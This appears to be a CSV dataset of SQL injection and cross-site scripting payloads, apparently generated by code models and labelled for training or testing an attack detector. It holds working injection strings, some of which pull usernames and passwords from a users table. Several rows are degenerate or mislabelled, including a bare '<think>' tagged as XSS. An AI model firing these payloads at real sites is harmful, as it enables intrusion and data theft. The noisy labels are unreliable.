text,label,attack_type,generator
1' AND '1'='1,1,sqli,codellama
1' AND '1'='2,1,sqli,codellama
1' AND '1'='3,1,sqli,codellama
1' AND '1'='4,1,sqli,codellama
1' AND '1'='5,1,sqli,codellama
1' AND '1'='6,1,sqli,codellama
1' AND '1'='7,1,sqli,codellama
1' AND '1'='8,1,sqli,codellama
1' AND '1'='9,1,sqli,codellama
1' AND '1'='10,1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--",1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",1,sqli,codellama
"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",1,sqli,codellama
1' OR SLEEP(10)='1',1,sqli,codellama
<script>alert(1)</script>,1,xss,codellama
<script>alert(2)</script>,1,xss,codellama
<script>alert(3)</script>,1,xss,codellama
<script>alert(4)</script>,1,xss,codellama
<script>alert(5)</script>,1,xss,codellama
<script>alert(6)</script>,1,xss,codellama
<script>alert(7)</script>,1,xss,codellama
<script>alert(8)</script>,1,xss,codellama
<script>alert(9)</script>,1,xss,codellama
<script>alert(10)</script>,1,xss,codellama
<img src=x onerror=alert(1)>,1,xss,codellama
<svg onload=alert(1)>,1,xss,codellama
<a href=javascript:alert(1)>click me</a>,1,xss,codellama
<a href=# onclick=alert(1)>click me</a>,1,xss,codellama
<a href=# onmouseover=alert(1)>click me</a>,1,xss,codellama
<a href=# onfocus=alert(1)>click me</a>,1,xss,codellama
<a href=# onmousedown=alert(1)>click me</a>,1,xss,codellama
<a href=# onmouseup=alert(1)>click me</a>,1,xss,codellama
<a href=# onmouseout=alert(1)>click me</a>,1,xss,codellama
1' ONCLICK='alert(1)',1,xss,codellama
AND 1=1,1,sqli,deepseek-r1
AND 1=2,1,sqli,deepseek-r1
' AND 1=1,1,sqli,deepseek-r1
' AND 1=2,1,sqli,deepseek-r1
OR 1=1,1,sqli,deepseek-r1
OR 1=2,1,sqli,deepseek-r1
' OR 1=1,1,sqli,deepseek-r1
' OR 1=2,1,sqli,deepseek-r1
' OR =1,1,sqli,deepseek-r1
"1' UNION SELECT username, password FROM users--",1,sqli,deepseek-r1
"1 UNION ALL SELECT table_name, column_name FROM information_schema.columns--",1,sqli,deepseek-r1
"1' UNION SELECT name, email FROM users--",1,sqli,deepseek-r1
"1' UNION SELECT id, name, email FROM users--",1,sqli,deepseek-r1
1' UNION SELECT * FROM users--,1,sqli,deepseek-r1
"1' UNION SELECT username, password FROM users LIMIT 1--",1,sqli,deepseek-r1
"1' UNION SELECT name, birthdate FROM users--",1,sqli,deepseek-r1
"1' UNION SELECT id, username, password FROM users--",1,sqli,deepseek-r1
"1' UNION SELECT column1, column2 FROM table_name--",1,sqli,deepseek-r1
"1' UNION SELECT name, address FROM users--",1,sqli,deepseek-r1
"' UNION SELECT NULL,SLEEP(5)--",1,sqli,deepseek-r1
<think>,1,xss,deepseek-r1
